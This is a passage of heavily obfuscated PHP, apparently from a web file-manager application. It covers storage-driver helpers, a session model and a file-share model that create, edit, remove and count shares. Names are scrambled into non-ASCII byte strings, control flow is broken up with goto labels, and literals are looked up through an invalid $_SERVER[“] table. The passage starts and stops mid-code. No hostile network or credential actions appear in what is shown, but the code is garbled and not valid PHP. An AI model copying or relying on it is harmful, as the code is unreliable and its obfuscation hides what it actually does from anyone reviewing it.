$føÙ´ã¨—õ; } public static function defaultDriver() { return Model($_SERVER[“][687])->defaultDriver(); } public static function defaultIO() { $d…¯º†¶Óß =& $_SERVER[“]; $a°éÙî†¾… = self::defaultDriver(); return $d…¯º†¶Óß[1077] . $a°éÙî†¾…[$d…¯º†¶Óß[367]] . $d…¯º†¶Óß[1064]; } public static function defaultDriverInit() { static $C™»Ä†¸Äã = false; if ($C™»Ä†¸Äã) { return $C™»Ä†¸Äã; } $C™»Ä†¸Äã = IO::init(self::defaultIO()); return $C™»Ä†¸Äã; } public static function fileTypeList() { $Eœµ¤ÖëĞ =& $_SERVER[“]; $EŞ”õò°Ï× = $GLOBALS[$Eœµ¤ÖëĞ[6]][$Eœµ¤ÖëĞ[1078]]; foreach ($EŞ”õò°Ï× as $fÅÅõ²ÌÕ => $eï™öâòŒô) { $C¬·‰¥ÏÀ = $Eœµ¤ÖëĞ[1079] . $fÅÅõ²ÌÕ; $C„Üö ØÕ = LNG($C¬·‰¥ÏÀ); if ($C¬·‰¥ÏÀ != $C„Üö ØÕ) { $EŞ”õò°Ï×[$fÅÅõ²ÌÕ][$Eœµ¤ÖëĞ[28]] = $C„Üö ØÕ; } } return $EŞ”õò°Ï×; } public static function transferType($A‚ÊË¢æÚ, $Dİ³‘øöíæ) { goto EÃ½‚‰Ù•; c´¨İàË·ç: return $c”¤£·Î§Í[1082]; goto AøÓÃ³‚öÀ; EÃ½‚‰Ù•: $c”¤£·Î§Í =& $_SERVER[“]; $B×ÉĞˆÅ®° = self::driverType($A‚ÊË¢æÚ); $BÚß‘Œ‹ª = self::driverType($Dİ³‘øöíæ); goto f¨ÉÎ¾ŞÈ¨; f¨ÉÎ¾ŞÈ¨: if ($B×ÉĞˆÅ®°[$c”¤£·Î§Í[29]] == $BÚß‘Œ‹ª[$c”¤£·Î§Í[29]] && $B×ÉĞˆÅ®°[$c”¤£·Î§Í[1080]] == $BÚß‘Œ‹ª[$c”¤£·Î§Í[1080]]) { return $c”¤£·Î§Í[1081]; } if ($B×ÉĞˆÅ®°[$c”¤£·Î§Í[29]] == $c”¤£·Î§Í[763] && $BÚß‘Œ‹ª[$c”¤£·Î§Í[29]] == $c”¤£·Î§Í[102]) { return $c”¤£·Î§Í[1027]; } if ($B×ÉĞˆÅ®°[$c”¤£·Î§Í[29]] == $c”¤£·Î§Í[102] && $BÚß‘Œ‹ª[$c”¤£·Î§Í[29]] == $c”¤£·Î§Í[763]) { return $c”¤£·Î§Í[103]; } goto c´¨İàË·ç; AøÓÃ³‚öÀ: } public static function driverType($A­ñÂäÖÇ‰) { goto e¢‘×Äƒ™ó; bê’ò¡­§¿: if ($b”·©Õ­Ñë == $E¥«Ø‰”÷ê[678] || $b”·©Õ­Ñë == $E¥«Ø‰”÷ê[1084] || $b”·©Õ­Ñë == $E¥«Ø‰”÷ê[1085]) { $A­ñÂäÖÇ‰ = self::defaultDriverInit(); } else { if ($b”·©Õ­Ñë == $E¥«Ø‰”÷ê[1035] || $b”·©Õ­Ñë == $E¥«Ø‰”÷ê[1086]) { $A­ñÂäÖÇ‰ = IO::init($A­ñÂäÖÇ‰->pathParse[$E¥«Ø‰”÷ê[985]]); } } $b”·©Õ­Ñë = str_replace($E¥«Ø‰”÷ê[1083], $E¥«Ø‰”÷ê[33], strtolower($A­ñÂäÖÇ‰->getType())); if ($b”·©Õ­Ñë == $E¥«Ø‰”÷ê[102]) { return array($E¥«Ø‰”÷ê[29] => $E¥«Ø‰”÷ê[102], $E¥«Ø‰”÷ê[1080] => $E¥«Ø‰”÷ê[33], $E¥«Ø‰”÷ê[75] => $d‰×½ŞŒ˜É); } goto E†ô‚òåÀö; E†ô‚òåÀö: return array($E¥«Ø‰”÷ê[29] => $E¥«Ø‰”÷ê[763], $E¥«Ø‰”÷ê[1080] => $A­ñÂäÖÇ‰->pathDriver, $E¥«Ø‰”÷ê[75] => $d‰×½ŞŒ˜É); goto fŒÉ¸Á Ø; e¢‘×Äƒ™ó: $E¥«Ø‰”÷ê =& $_SERVER[“]; $d‰×½ŞŒ˜É = $A­ñÂäÖÇ‰->path; $b”·©Õ­Ñë = str_replace($E¥«Ø‰”÷ê[1083], $E¥«Ø‰”÷ê[33], strtolower($A­ñÂäÖÇ‰->getType())); goto bê’ò¡­§¿; fŒÉ¸Á Ø: } } goto FÔï„‰Äó; E¢îêÉÄÃ‚: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\x73\145\163\x73\151\157\x6e"; public function get($EÒõ´Ö¼ë) { $CŸğßëçô =& $_SERVER[“]; $AË•Ö• Û = $this->where(array($CŸğßëçô[2213] => $EÒõ´Ö¼ë))->find(); if (!is_array($AË•Ö• Û)) { return !1; } return $AË•Ö• Û[$CŸğßëçô[676]]; } public function set($Dø×¬ª‡ë², $EªåÀÇ´º¹, $bÓ£¸õ®Õ = 3600) { $CÒÁØ»¢øÀ =& $_SERVER[“]; $b„µäáè = array($CÒÁØ»¢øÀ[2213] => $Dø×¬ª‡ë², $CÒÁØ»¢øÀ[2125] => $EªåÀÇ´º¹, $CÒÁØ»¢øÀ[2214] => $bÓ£¸õ®Õ + time()); if (Session::get($CÒÁØ»¢øÀ[2215])) { $b„µäáè[$CÒÁØ»¢øÀ[1423]] = Session::get($CÒÁØ»¢øÀ[2215]); } else { $b„µäáè[$CÒÁØ»¢øÀ[1423]] = 0; } if ($this->get($Dø×¬ª‡ë²)) { return $this->where(array($CÒÁØ»¢øÀ[2213] => $Dø×¬ª‡ë²))->save($b„µäáè); } else { return $this->add($b„µäáè, array(), !0); } } public function remove($EŞª±“Ì¨) { return $this->where(array($_SERVER[“][2213] => $EŞª±“Ì¨))->delete(); } public function clearTimeout() { return $this->where($_SERVER[“][2216] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\151\155\145", "\164\x69\155\x65", "\151\156\x73\x65\162\164\54\x75\160\144\x61\164\x65", "\146\x75\x6e\x63\x74\x69\x6f\156"), array("\x63\x72\x65\x61\x74\x65\124\x69\155\x65", "\164\x69\155\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\x6e\x63\164\151\x6f\156"), array("\157\160\164\x69\x6f\156\163", '', "\x69\x6e\163\x65\x72\164\x2c\x75\x70\144\x61\164\145\x2c\163\145\x6c\x65\x63\x74", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($bäõìõ—Ø) { $Dî©ëù„Ñ¯ =& $_SERVER[“]; $DçÀÌ§ˆï› = isset($bäõìõ—Ø[0]) ? $bäõìõ—Ø[0] : !1; return array($Dî©ëù„Ñ¯[2217] => array(USER_ID, $Dî©ëù„Ñ¯[2218]), $Dî©ëù„Ñ¯[2166] => array($DçÀÌ§ˆï›, $Dî©ëù„Ñ¯[2219])); } protected function listSimple() { $d…ÍöìôŠ£ = array($_SERVER[“][1423] => USER_ID); $B¦ÛçÁÍÔÑ = $this->field($this->fieldList)->where($d…ÍöìôŠ£)->select(); return $B¦ÛçÁÍÔÑ ? $B¦ÛçÁÍÔÑ : array(); } protected function getInfo($CšÓñ„Ô°‘, $aĞÓŞÎÙ¿õ = false) { $c–‚ğ¸ì‘Œ =& $_SERVER[“]; if ($aĞÓŞÎÙ¿õ) { return $this->_getShareInfo(array($c–‚ğ¸ì‘Œ[441] => $CšÓñ„Ô°‘)); } $a¨“¬‘œŠõ = $this->cacheFunctionGet($c–‚ğ¸ì‘Œ[2220], $CšÓñ„Ô°‘); return $a¨“¬‘œŠõ; } public function getInfoByHash($c†ë½”õ±œ) { return $this->_getShareInfo(array($_SERVER[“][443] => $c†ë½”õ±œ)); } public function getInfoByPath($d…Ïî¥ÖÇ‡) { $eš–ÀØ´µ =& $_SERVER[“]; $bˆÊÇàÓµ = array($eš–ÀØ´µ[1423] => USER_ID, $eš–ÀØ´µ[369] => $d…Ïî¥ÖÇ‡); return $this->_getShareInfo($bˆÊÇàÓµ); } public function getInfoBySourcePath($FÂ®›ÓçÁ÷) { $aì›œõ‹Ñ =& $_SERVER[“]; $Böàõ’ôŒ = array($aì›œõ‹Ñ[1423] => USER_ID, $aì›œõ‹Ñ[1006] => $FÂ®›ÓçÁ÷); return $this->_getShareInfo($Böàõ’ôŒ); } private function _getShareInfo($b‘‘Œí…ê) { goto eš¼ïª‘™š; FÈ­¥ƒøã: $b‘‘Œí…ê = array($aõÓÎ­µÂƒ[441] => $EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[441]]); $eÄ™‹µšÙŞ = $aõÓÎ­µÂƒ[2221]; $f³“©Ùß§ï = Model($aõÓÎ­µÂƒ[539])->order($aõÓÎ­µÂƒ[367])->field($eÄ™‹µšÙŞ)->where($b‘‘Œí…ê)->select(); goto fà™ĞãæÅ; eš¼ïª‘™š: $aõÓÎ­µÂƒ =& $_SERVER[“]; $EÀ«øÑ»ì× = $this->where($b‘‘Œí…ê)->find(); if (!$EÀ«øÑ»ì×) { return !1; } goto FÈ­¥ƒøã; fà™ĞãæÅ: if ($EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[369]] == $aõÓÎ­µÂƒ[470]) { $EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[391]] = IO::info($EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[1006]]); } else { $EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[391]] = Model($aõÓÎ­µÂƒ[1104])->pathInfo($EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[369]]); } $EÀ«øÑ»ì×[$aõÓÎ­µÂƒ[2222]] = $f³“©Ùß§ï; return $EÀ«øÑ»ì×; goto B¡ÓŞ‚ñç¹; B¡ÓŞ‚ñç¹: } protected function getInfoAuth($EÓ®‡ÒŒ‘) { $aåß©Ö®Àé =& $_SERVER[“]; $f×†Õ‰í = $this->getInfo($EÓ®‡ÒŒ‘); $f×†Õ‰í[$aåß©Ö®Àé[376]] = Model($aåß©Ö®Àé[456])->authMake($f×†Õ‰í[$aåß©Ö®Àé[2222]]); return $f×†Õ‰í; } protected function listData($eŞ—­ä„  = null, $aºë‰Û  = 300) { $b¡òéÔßÅ– =& $_SERVER[“]; $d‰‰ŞÕ†ç = array(array($b¡òéÔßÅ–[446] => array($b¡òéÔßÅ–[912], 0), $b¡òéÔßÅ–[448] => array($b¡òéÔßÅ–[912], 0), $b¡òéÔßÅ–[2223] => $b¡òéÔßÅ–[2180])); if ($eŞ—­ä„  == $b¡òéÔßÅ–[1861]) { $d‰‰ŞÕ†ç = array($b¡òéÔßÅ–[446] => 1); } else { if ($eŞ—­ä„  == $b¡òéÔßÅ–[995]) { $d‰‰ŞÕ†ç = array($b¡òéÔßÅ–[448] => 1); } } $d‰‰ŞÕ†ç[$b¡òéÔßÅ–[1423]] = USER_ID; $CÆ†­˜ÌÇ× = $this->where($d‰‰ŞÕ†ç)->selectPage($aºë‰Û ); return $CÆ†­˜ÌÇ×; } protected function listToMe($eÀøà›ª·î = 300) { goto Aí‘ä…ÍĞ; ağæ…ÊºĞ: $d±ÄÕ£×¶ = array($bƒ˜¦š”á[2226] => $e¥—ÚÍâºÏ, $bƒ˜¦š”á[2227] => $Ağ¬ó¢•ñ…[$bƒ˜¦š”á[351]]); return $d±ÄÕ£×¶; goto f±§ùÕÌº ; eƒ¦—ÄÏÒÜ: $CŠöÄö®÷ì = array($bƒ˜¦š”á[523] => SourceModel::TYPE_USER, $bƒ˜¦š”á[458] => USER_ID); if ($CŸ†µ½É) { $CŠöÄö®÷ì = array(array($bƒ˜¦š”á[523] => SourceModel::TYPE_USER, $bƒ˜¦š”á[458] => USER_ID), array($bƒ˜¦š”á[523] => SourceModel::TYPE_GROUP, $bƒ˜¦š”á[458] => array($bƒ˜¦š”á[7], $CŸ†µ½É)), $bƒ˜¦š”á[2223] => $bƒ˜¦š”á[2180]); } $Ağ¬ó¢•ñ… = Model($bƒ˜¦š”á[539])->where($CŠöÄö®÷ì)->selectPage($eÀøà›ª·î); goto c º´ÆĞšÔ; Aí‘ä…ÍĞ: $bƒ˜¦š”á =& $_SERVER[“]; $c›‹¤‹«ğË = Session::get($bƒ˜¦š”á[2224]); $CŸ†µ½É = array_to_keyvalue($c›‹¤‹«ğË, $bƒ˜¦š”á[33], $bƒ˜¦š”á[2095]); goto eƒ¦—ÄÏÒÜ; cÒ“‘ç¶¤â: $CŠöÄö®÷ì = array($bƒ˜¦š”á[441] => array($bƒ˜¦š”á[384], array_keys($C¾×Çœß…‡))); $e¥—ÚÍâºÏ = $this->field($Bø¦›ìŒöê)->where($CŠöÄö®÷ì)->select(); foreach ($e¥—ÚÍâºÏ as $B‹ŒÔƒÀİñ => &$FÉö‘¥é…³) { $FÉö‘¥é…³[$bƒ˜¦š”á[2222]] = $C¾×Çœß…‡[$FÉö‘¥é…³[$bƒ˜¦š”á[441]]]; } goto ağæ…ÊºĞ; c º´ÆĞšÔ: $C¾×Çœß…‡ = array_to_keyvalue_group($Ağ¬ó¢•ñ…[$bƒ˜¦š”á[354]], $bƒ˜¦š”á[441]); if (!$C¾×Çœß…‡) { return $Ağ¬ó¢•ñ…; } $Bø¦›ìŒöê = $bƒ˜¦š”á[2225]; goto cÒ“‘ç¶¤â; f±§ùÕÌº : } protected function shareAdd($fÃç²ôˆ¦Õ, $EèÑ¡ãŠ´º) { $C‰ÀÕÕ•¹‚ =& $_SERVER[“]; $b¸ëä—ÛÒÖ = $this->_addShareData($fÃç²ôˆ¦Õ, $EèÑ¡ãŠ´º); if (!empty($EèÑ¡ãŠ´º[$C‰ÀÕÕ•¹‚[2228]])) { $this->_shareAuthSet($b¸ëä—ÛÒÖ, $EèÑ¡ãŠ´º[$C‰ÀÕÕ•¹‚[2228]]); } $this->shareEventAdd($fÃç²ôˆ¦Õ, $EèÑ¡ãŠ´º, $C‰ÀÕÕ•¹‚[998]); return $b¸ëä—ÛÒÖ; } private function shareEventAdd($d‹‘¶Á‹ÊÇ, $eÃ– ªÎëÉ, $DæİÊõ…‰í = "\x61\x64\144") { goto C‘Áƒæ—¥ƒ; f¨¹Ñ´‚Çä: $a¤¥Öö±Î = $bæšªõŞ×Ç[2231]; if ($fšÕªÜñ»ê[$bæšªõŞ×Ç[446]] == $bæšªõŞ×Ç[470] && $eÃ– ªÎëÉ[$bæšªõŞ×Ç[446]] == $bæšªõŞ×Ç[83]) { $a¤¥Öö±Î = $bæšªõŞ×Ç[2229]; } if ($fšÕªÜñ»ê[$bæšªõŞ×Ç[446]] == $bæšªõŞ×Ç[83] && $eÃ– ªÎëÉ[$bæšªõŞ×Ç[446]] == $bæšªõŞ×Ç[470]) { $a¤¥Öö±Î = $bæšªõŞ×Ç[2232]; } goto FöÛ­àâö; FöÛ­àâö: if ($fšÕªÜñ»ê[$bæšªõŞ×Ç[448]] == $bæšªõŞ×Ç[470] && $eÃ– ªÎëÉ[$bæšªõŞ×Ç[448]] == $bæšªõŞ×Ç[83]) { $a¤¥Öö±Î = $bæšªõŞ×Ç[2230]; } if ($fšÕªÜñ»ê[$bæšªõŞ×Ç[448]] == $bæšªõŞ×Ç[83] && $eÃ– ªÎëÉ[$bæšªõŞ×Ç[448]] == $bæšªõŞ×Ç[470]) { $a¤¥Öö±Î = $bæšªõŞ×Ç[2233]; } Model($bæšªõŞ×Ç[507])->eventShare($d‹‘¶Á‹ÊÇ, $a¤¥Öö±Î); goto Eµ³½…Í¢«; C‘Áƒæ—¥ƒ: $bæšªõŞ×Ç =& $_SERVER[“]; if ($DæİÊõ…‰í == $bæšªõŞ×Ç[998]) { if ($eÃ– ªÎëÉ[$bæšªõŞ×Ç[446]] == $bæšªõŞ×Ç[83]) { Model($bæšªõŞ×Ç[507])->eventShare($d‹‘¶Á‹ÊÇ, $bæšªõŞ×Ç[2229]); } if ($eÃ– ªÎëÉ[$bæšªõŞ×Ç[448]] == $bæšªõŞ×Ç[83]) { Model($bæšªõŞ×Ç[507])->eventShare($d‹‘¶Á‹ÊÇ, $bæšªõŞ×Ç[2230]); } return; } $fšÕªÜñ»ê = $this->getInfoByPath($d‹‘¶Á‹ÊÇ); goto f¨¹Ñ´‚Çä; Eµ³½…Í¢«: return; goto C¿ÙŠ’Õ¨“; C¿ÙŠ’Õ¨“: } private function _addShareData($bƒ…ğ¶¤Ö…, $fØ©˜™ŒŸ = array()) { goto e˜İ…Œïªç; aïâ’¾µƒô: if ($AÑ¹š¸§Ã« = $this->where($f·£âëœÇ)->find()) { return $AÑ¹š¸§Ã«[$Dê…àÉ¸°¥[441]]; } if ($bƒ…ğ¶¤Ö… == 0) { $aİÏ•‚˜´ç = array($Dê…àÉ¸°¥[28] => get_path_this($fØ©˜™ŒŸ[$Dê…àÉ¸°¥[75]])); } else { $aİÏ•‚˜´ç = Model($Dê…àÉ¸°¥[736])->sourceInfo($bƒ…ğ¶¤Ö…); if (!$aİÏ•‚˜´ç) { return !1; } } if (!$fØ©˜™ŒŸ[$Dê…àÉ¸°¥[1328]]) { $fØ©˜™ŒŸ[$Dê…àÉ¸°¥[1328]] = $aİÏ•‚˜´ç[$Dê…àÉ¸°¥[28]]; } goto C‘¥ù˜Üâ›; e˜İ…Œïªç: $Dê…àÉ¸°¥ =& $_SERVER[“]; $f·£âëœÇ = array($Dê…àÉ¸°¥[383] => $bƒ…ğ¶¤Ö…, $Dê…àÉ¸°¥[1413] => USER_ID); if ($bƒ…ğ¶¤Ö… == 0) { $f·£âëœÇ = array($Dê…àÉ¸°¥[2234] => $fØ©˜™ŒŸ[$Dê…àÉ¸°¥[1006]], $Dê…àÉ¸°¥[1413] => USER_ID); } goto aïâ’¾µƒô; E‹…¯êò©é: return $BìÛ²æ¯‡÷; goto E“¯°Ì‰ÔÉ; C‘¥ù˜Üâ›: $B‰‹¦©¯¯ = array($Dê…àÉ¸°¥[1413] => USER_ID, $Dê…àÉ¸°¥[383] => $bƒ…ğ¶¤Ö…, $Dê…àÉ¸°¥[1328] => $Dê…àÉ¸°¥[33], $Dê…àÉ¸°¥[446] => 0, $Dê…àÉ¸°¥[448] => 0, $Dê…àÉ¸°¥[1006] => $Dê…àÉ¸°¥[33], $Dê…àÉ¸°¥[295] => $Dê…àÉ¸°¥[33], $Dê…àÉ¸°¥[788] => $Dê…àÉ¸°¥[33], $Dê…àÉ¸°¥[2235] => 0, $Dê…àÉ¸°¥[2236] => 0, $Dê…àÉ¸°¥[449] => 0, $Dê…àÉ¸°¥[450] => $Dê…àÉ¸°¥[33], $Dê…àÉ¸°¥[443] => $Dê…àÉ¸°¥[33]); $E‰™Æ‡æœÍ = explode($Dê…àÉ¸°¥[47], $Dê…àÉ¸°¥[2237]); foreach ($E‰™Æ‡æœÍ as $Aäåá‚ŒÙ¾) { if (!isset($fØ©˜™ŒŸ[$Aäåá‚ŒÙ¾])) { continue; } $B‰‹¦©¯¯[$Aäåá‚ŒÙ¾] = $fØ©˜™ŒŸ[$Aäåá‚ŒÙ¾]; } goto aÉªÒ‘Â×; aÉªÒ‘Â×: $BìÛ²æ¯‡÷ = $this->add($B‰‹¦©¯¯); $Cœ«²Ø‹³¨ = array($Dê…àÉ¸°¥[443] => short_id($BìÛ²æ¯‡÷)); $this->where(array($Dê…àÉ¸°¥[440] => $BìÛ²æ¯‡÷))->save($Cœ«²Ø‹³¨); goto E‹…¯êò©é; E“¯°Ì‰ÔÉ: } private function _shareAuthSet($BÄ±©ß×¼, $d¹®ùß²ê±) { goto aôÜ®¢†; aØÃŸ•îÉ: $aÆ—œ¦±»Ç->where(array($dö¢Œ‚±¡‰[441] => $BÄ±©ß×¼))->delete(); $EŒÏ ˆ ª½ = array(); foreach ($d¹®ùß²ê± as $D©”˜ñ ¬) { $cµ›ÓáŞšé = SourceModel::TYPE_USER; if ($D©”˜ñ ¬[$dö¢Œ‚±¡‰[371]] == SourceModel::TYPE_GROUP) { $cµ›ÓáŞšé = SourceModel::TYPE_GROUP; } $c†Ò†ô“ØÏ = array($dö¢Œ‚±¡‰[441] => $BÄ±©ß×¼, $dö¢Œ‚±¡‰[371] => $cµ›ÓáŞšé, $dö¢Œ‚±¡‰[458] => intval($D©”˜ñ ¬[$dö¢Œ‚±¡‰[458]]), $dö¢Œ‚±¡‰[2239] => 0, $dö¢Œ‚±¡‰[2240] => -1); if ($D©”˜ñ ¬[$dö¢Œ‚±¡‰[2239]]) { $c†Ò†ô“ØÏ[$dö¢Œ‚±¡‰[2239]] = $D©”˜ñ ¬[$dö¢Œ‚±¡‰[2239]]; } else { if ($D©”˜ñ ¬[$dö¢Œ‚±¡‰[2240]]) { $c†Ò†ô“ØÏ[$dö¢Œ‚±¡‰[2240]] = $D©”˜ñ ¬[$dö¢Œ‚±¡‰[2240]]; } } $EŒÏ ˆ ª½[] = $c†Ò†ô“ØÏ; } goto aˆšº­ôŸ»; aˆšº­ôŸ»: return $aÆ—œ¦±»Ç->addAll($EŒÏ ˆ ª½, array(), !0); goto f¥Ÿ®ñ¿Õ; aôÜ®¢†: $dö¢Œ‚±¡‰ =& $_SERVER[“]; if (!is_array($d¹®ùß²ê±)) { return !1; } $aÆ—œ¦±»Ç = Model($dö¢Œ‚±¡‰[2238]); goto aØÃŸ•îÉ; f¥Ÿ®ñ¿Õ: } public function numViewAdd($F‡½Óõî‚­) { $BÂµù¬©§² =& $_SERVER[“]; $AÎ÷¯ø¢İË = array($BÂµù¬©§²[440] => $F‡½Óõî‚­); $this->where($AÎ÷¯ø¢İË)->setAdd($BÂµù¬©§²[2235]); } public function numDownloadAdd($C¨ÙÜŠøŸÙ) { $fŸ«Ä¾Î° =& $_SERVER[“]; $d­—‚«ƒ = array($fŸ«Ä¾Î°[440] => $C¨ÙÜŠøŸÙ); $this->where($d­—‚«ƒ)->setAdd($fŸ«Ä¾Î°[2236]); } protected function shareEdit($bäªŠ„•™, $Eò­ŞØäö¡) { goto A®°›ÃÂÙ¬; A®°›ÃÂÙ¬: $f¥£¶ÀË£œ =& $_SERVER[“]; $f©í£¯ŠŸˆ = $this->getInfo($bäªŠ„•™); if (!$f©í£¯ŠŸˆ) { return !1; } goto fÖÕ–Œ™ÜÖ; E§Ì¨“Ğ: foreach ($B­¢ïµâ‚ as $d–˜ÜÑÒ”) { if (!array_key_exists($d–˜ÜÑÒ”, $Eò­ŞØäö¡)) { continue; } $A½š½Ëƒª [$d–˜ÜÑÒ”] = $Eò­ŞØäö¡[$d–˜ÜÑÒ”]; } $this->shareEventAdd($f©í£¯ŠŸˆ[$f¥£¶ÀË£œ[369]], $Eò­ŞØäö¡, $f¥£¶ÀË£œ[2062]); $this->where(array($f¥£¶ÀË£œ[440] => $bäªŠ„•™))->save($A½š½Ëƒª ); goto eì©Óô—ìé; fÖÕ–Œ™ÜÖ: $this->_checkLinkShare($Eò­ŞØäö¡, $f©í£¯ŠŸˆ); $A½š½Ëƒª  = array(); $B­¢ïµâ‚ = explode($f¥£¶ÀË£œ[47], $f¥£¶ÀË£œ[2241]); goto E§Ì¨“Ğ; eì©Óô—ìé: if (isset($Eò­ŞØäö¡[$f¥£¶ÀË£œ[2228]])) { $this->_shareAuthSet($bäªŠ„•™, $Eò­ŞØäö¡[$f¥£¶ÀË£œ[2228]]); } return !0; goto F›Áæö×Ô; F›Áæö×Ô: } private function _checkLinkShare($AÒ­‹Ñá‡, $DáõÙéÃÄ) { goto A–¹—©¹İ´; A–¹—©¹İ´: $B¢Ñ¦âä  =& $_SERVER[“]; if ($AÒ­‹Ñá‡[$B¢Ñ¦âä [446]] != $B¢Ñ¦âä [83]) { return; } $CßÇèê½±Ù = $DáõÙéÃÄ[$B¢Ñ¦âä [391]][$B¢Ñ¦âä [369]]; goto c»Æ¦¥×Ú„; c»Æ¦¥×Ú„: if ($DáõÙéÃÄ[$B¢Ñ¦âä [391]][$B¢Ñ¦âä [29]] != $B¢Ñ¦âä [167]) { $FƒÕÎĞÆ®Ï = $this->_folderReport($CßÇèê½±Ù); if (!$FƒÕÎĞÆ®Ï) { return; } show_json(LNG($B¢Ñ¦âä [2242]) . $B¢Ñ¦âä [2243] . $FƒÕÎĞÆ®Ï, !1); } $aê‚„ç“Ë = Model($B¢Ñ¦âä [736])->fileInfoGet($DáõÙéÃÄ[$B¢Ñ¦âä [391]][$B¢Ñ¦âä [369]]); if (!$aê‚„ç“Ë) { return; } goto EâŞñ„ÖÇÅ; EâŞñ„ÖÇÅ: $E›¼ÍîêÅ» = $this->shareFileMeta($aê‚„ç“Ë[$B¢Ñ¦âä [419]]); if (isset($E›¼ÍîêÅ»[$B¢Ñ¦âä [359]]) && $E›¼ÍîêÅ»[$B¢Ñ¦âä [359]] == $B¢Ñ¦âä [83]) { show_json(LNG($B¢Ñ¦âä [2244]), !1); } goto A²¼ÃÀì§; A²¼ÃÀì§: } private function _folderReport($C©ùÀ¾â•Š) { goto AÙŒÓõë„–; CŞ†æè»šÈ: if (!$b²‘ƒøÊ) { return !1; } $b²‘ƒøÊ = array_to_keyvalue($b²‘ƒøÊ, $E‘ø××ğ[33], $E‘ø××ğ[419]); $F·Šèó¤è¯ = $E‘ø××ğ[47] . $C©ùÀ¾â•Š . $E‘ø××ğ[47]; goto eê‘É¹‘ƒ÷; aô–ºô–œÍ: $e°“¤ÔõñØ = substr($aêƒŒ×íÕ[$E‘ø××ğ[461]], strpos($aêƒŒ×íÕ[$E‘ø××ğ[461]], $F·Šèó¤è¯)); $dê„¼Ú‰‡å = array($E‘ø××ğ[369] => array($E‘ø××ğ[7], trim($e°“¤ÔõñØ, $E‘ø××ğ[47]))); $d¨Ù·µÄÌà = Model($E‘ø××ğ[736])->where($dê„¼Ú‰‡å)->field($E‘ø××ğ[28])->select(); goto C˜Óä¸õù; AÙŒÓõë„–: $E‘ø××ğ =& $_SERVER[“]; $dê„¼Ú‰‡å = array($E‘ø××ğ[419] => array($E‘ø××ğ[912], 0), $E‘ø××ğ[673] => 3); $b²‘ƒøÊ = Model($E‘ø××ğ[2245])->where($dê„¼Ú‰‡å)->field($E‘ø××ğ[419])->select(); goto CŞ†æè»šÈ; eê‘É¹‘ƒ÷: $dê„¼Ú‰‡å = array($E‘ø××ğ[419] => array($E‘ø××ğ[7], $b²‘ƒøÊ), $E‘ø××ğ[461] => array($E‘ø××ğ[735], "\x25{$F·Šèó¤è¯}\x25"), $E‘ø××ğ[397] => 0); $aêƒŒ×íÕ = Model($E‘ø××ğ[736])->where($dê„¼Ú‰‡å)->field($E‘ø××ğ[2246])->find(); if (!$aêƒŒ×íÕ) { return !1; } goto aô–ºô–œÍ; C˜Óä¸õù: $c¦Ğ‘ºŠ‰‚ = array_to_keyvalue($d¨Ù·µÄÌà, $E‘ø××ğ[33], $E‘ø××ğ[28]); $c¦Ğ‘ºŠ‰‚[] = $aêƒŒ×íÕ[$E‘ø××ğ[28]]; return implode($E‘ø××ğ[8], $c¦Ğ‘ºŠ‰‚); goto EŸùÎ¼ëÎÍ; EŸùÎ¼ëÎÍ: } protected function remove($cŠ¤îíß’ˆ) { goto Eà¯‰éÌ”†; c‰ƒ£¢Šë: $f‹³ƒ»è»Á = $this->where($Déáâ‡İßˆ)->delete(); if ($f‹³ƒ»è»Á) { Model($C‰ƒ­¼ùæğ[539])->where(array($C‰ƒ­¼ùæğ[441] => $cŠ¤îíß’ˆ))->delete(); } $e‡ğ¨Îë·Š = is_array($cŠ¤îíß’ˆ) ? $cŠ¤îíß’ˆ[1] : array($cŠ¤îíß’ˆ); goto bí·¨—‘; bí·¨—‘: for ($F¡¸÷ÆÊù¼ = 0; $F¡¸÷ÆÊù¼ < count($e‡ğ¨Îë·Š); $F¡¸÷ÆÊù¼++) { $DùôÀòİÔ = $this->getInfo($e‡ğ¨Îë·Š[$F¡¸÷ÆÊù¼]); if ($DùôÀòİÔ[$C‰ƒ­¼ùæğ[448]] == $C‰ƒ­¼ùæğ[83]) { Model($C‰ƒ­¼ùæğ[507])->eventShare($DùôÀòİÔ[$C‰ƒ­¼ùæğ[369]], $C‰ƒ­¼ùæğ[2233]); } if ($DùôÀòİÔ[$C‰ƒ­¼ùæğ[446]] == $C‰ƒ­¼ùæğ[83]) { Model($C‰ƒ­¼ùæğ[507])->eventShare($DùôÀòİÔ[$C‰ƒ­¼ùæğ[369]], $C‰ƒ­¼ùæğ[2232]); } } return $f‹³ƒ»è»Á; goto CÇ ß¡ ë‡; Eà¯‰éÌ”†: $C‰ƒ­¼ùæğ =& $_SERVER[“]; if (is_array($cŠ¤îíß’ˆ)) { $cŠ¤îíß’ˆ = array($C‰ƒ­¼ùæğ[7], $cŠ¤îíß’ˆ); } $Déáâ‡İßˆ = array($C‰ƒ­¼ùæğ[441] => $cŠ¤îíß’ˆ); goto c‰ƒ£¢Šë; CÇ ß¡ ë‡: } protected function removeBySource($bŠÀ…è•ª) { goto c’‘ôçŸ¢Æ; c’‘ôçŸ¢Æ: $aĞ½Ì¨ˆô =& $_SERVER[“]; $f¹”áÃ¢Í© = array($aĞ½Ì¨ˆô[383] => array($aĞ½Ì¨ˆô[384], $bŠÀ…è•ª)); $bŸÃ¸Â´¡× = $this->field($aĞ½Ì¨ˆô[441])->where($f¹”áÃ¢Í©)->select(); goto F›µ‹´Ÿ—–; D•»÷¼Œİ: $this->where($f¹”áÃ¢Í©)->delete(); Model($aĞ½Ì¨ˆô[539])->where($f¹”áÃ¢Í©)->delete(); goto DŸÇˆÌ²©×; F›µ‹´Ÿ—–: $bŸÃ¸Â´¡× = array_to_keyvalue($bŸÃ¸Â´¡×, $aĞ½Ì¨ˆô[33], $aĞ½Ì¨ˆô[441]); if (!$bŸÃ¸Â´¡×) { return; } $f¹”áÃ¢Í© = array($aĞ½Ì¨ˆô[440] => array($aĞ½Ì¨ˆô[384], $bŸÃ¸Â´¡×)); goto 